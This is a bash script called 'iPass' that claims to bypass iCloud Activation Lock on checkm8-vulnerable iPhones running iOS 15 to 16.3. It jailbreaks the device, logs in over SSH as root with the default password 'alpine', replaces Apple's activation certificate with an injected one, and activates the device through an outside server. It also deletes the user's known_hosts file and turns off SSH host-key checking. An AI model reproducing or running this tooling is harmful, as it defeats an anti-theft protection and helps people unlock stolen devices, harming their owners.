
#!/usr/bin/env bash

# Made by @mrcreator1 @pwn2owned
clear
#stop asking me if i want to fucking save the damn key
rm -rf ~/.ssh/known_hosts

# Change the current working directory
cd "`dirname "$0"`"

# Check for Homebrew, install if we don't have it
if test ! $(which brew); then
    echo "Installing homebrew..."
    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" > /dev/null 2>&1
    echo ''
fi

# Check for sshpass, install if we don't have it
if test ! $(which sshpass); then
    echo "Installing sshpass..."
    brew install esolitos/ipa/sshpass > /dev/null 2>&1
    echo ''
fi

# Check for iproxy, install if we don't have it
if test ! $(which iproxy); then
    echo "Installing iproxy..."
    brew install libimobiledevice > /dev/null 2>&1
    echo ''
fi

sleep 1
echo "--------------------------------------------------------"
echo "

          ██▓ ██▓███   ▄▄▄        ██████   ██████
         ▓██▒▓██░  ██▒▒████▄    ▒██    ▒ ▒██    ▒
         ▒██▒▓██░ ██▓▒▒██  ▀█▄  ░ ▓██▄   ░ ▓██▄
         ░██░▒██▄█▓▒ ▒░██▄▄▄▄██   ▒   ██▒  ▒   ██▒
         ░██░▒██▒ ░  ░ ▓█   ▓██▒▒██████▒▒▒██████▒▒
         ░▓  ▒▓▒░ ░  ░ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░
          ▒ ░░▒ ░       ▒   ▒▒ ░░ ░▒  ░ ░░ ░▒  ░ ░
          ▒ ░░░         ░   ▒   ░  ░  ░  ░  ░  ░
          ░                 ░  ░      ░        ░
                                         
"
echo "ver 1.2 (mac os universal) x86_64 + arm64 (Apple Silicon)"
echo "--------------------------------------------------------"
echo ""
echo "Welcome to iPass! iOS 15.X - 16.3 Tethered iCloud Bypass for checkm8 devices."
echo "This bypass runs in less than 1 minute!!! Also doesn't create a fakefs!"
echo ""
echo "Thanks to @mrcreator1 @pwn2owned for bypass"
echo "Thanks to @palera1n for jb"
echo ""
echo "--------------------------------------------------------"
echo "Connect device in normal, recovery OR DFU mode."
echo ""
echo "Once device is connected, press Enter..."
while [ true ] ; do
read -t 3 -n 1
if [ $? = 0 ] ; then

    echo "Jailbreaking iOS 15.X-16.3..."
    sleep 2

    # start palera1n-c pongo shell first
    ./palera1n-macos-universal -p

    sleep 8

    # upload ssh ramdisk files
    ./palera1n-macos-universal -r ./PongoOS/build/ramdisk.dmg
    # wait 60 seconds for the device to have enough time to boot...
    sleep 28

    echo 'Killing any existing iproxys...'
    killall iproxy
    echo 'Starting iproxy...'

    sleep 1

    echo "Activating iOS 15.X-16.3 Tethered..."
    ./Darwin/iproxy 4444:44 > /dev/null 2>&1 &
#
#    echo "Tap Trust on the iDevice to pair!"
#    ./Darwin/idevicepair pair
#    while [ true ] ; do
#    read -t 3 -n 1
#    if [ $? = 0 ] ; then
#        ./Darwin/idevicepair pair
#        echo "Pairing done."
#        break
#    else
#        echo "Press Enter after your paired the device..."
#    fi
#    done

    sleep 2
    ./Darwin/sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no -p 4444 "root@localhost" 'mount -o rw,union,update /'
    
    ./Darwin/sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no -p 4444 "root@localhost" 'rm -rf /System/Library/PrivateFrameworks/MobileActivation.framework/Support/Certificates/RaptorActivation.pem'

    ./Darwin/sshpass -p 'alpine' scp -rP 4444 -o StrictHostKeyChecking=no ./pushFiles/RaptorActivation.pem root@localhost:/System/Library/PrivateFrameworks/MobileActivation.framework/Support/Certificates/RaptorActivation.pem
    echo "Certificate injected!"
    sleep 2
    ./Darwin/ideviceactivation activate -s https://euphoriatools.com/miunlock/activator.php -d
    sleep 1
    ./Darwin/sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no -p 4444 "root@localhost" 'uicache -all'
#    ./Darwin/sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no -p 4444 "root@localhost" 'killall backboardd'
    say Your device is now Unlocked
    echo ""
    echo "       ---   Tethered iCloud Bypass Complete! ---   "
    echo ""
    echo "iCloud Bypass iOS 15.X-16.3 Tethered Done. Enjoy friends!"
    echo ""
    echo "[x] @mrcreator1 @pwn2owned [x]"
    echo ""
    echo ""
    exit 1
else
    clear
    echo "--------------------------------------------------------"
    echo "

          ██▓ ██▓███   ▄▄▄        ██████   ██████
         ▓██▒▓██░  ██▒▒████▄    ▒██    ▒ ▒██    ▒
         ▒██▒▓██░ ██▓▒▒██  ▀█▄  ░ ▓██▄   ░ ▓██▄
         ░██░▒██▄█▓▒ ▒░██▄▄▄▄██   ▒   ██▒  ▒   ██▒
         ░██░▒██▒ ░  ░ ▓█   ▓██▒▒██████▒▒▒██████▒▒
         ░▓  ▒▓▒░ ░  ░ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░
          ▒ ░░▒ ░       ▒   ▒▒ ░░ ░▒  ░ ░░ ░▒  ░ ░
          ▒ ░░░         ░   ▒   ░  ░  ░  ░  ░  ░
          ░                 ░  ░      ░        ░
                                             
    "
    echo "ver 1.2 (mac os universal) x86_64 + arm64 (Apple Silicon)"
    echo "--------------------------------------------------------"
    echo ""
    echo "Welcome to iPass! iOS 15.X - 16.3 Tethered iCloud Bypass for checkm8 devices."
    echo "This bypass runs in less than 1 minute!!! Also doesn't create a fakefs!"
    echo ""
    echo "Thanks to @mrcreator1 @pwn2owned for bypass"
    echo "Thanks to @palera1n for jb"
    echo ""
    echo "--------------------------------------------------------"
    echo "Connect device in normal, recovery OR DFU mode."
    echo ""
    echo "Once device is connected, press Enter..."
    sleep 1
    echo ""
    echo "Waiting for user to press Enter..."
fi
done






















# Made by @mrcreator1 @pwn2owned
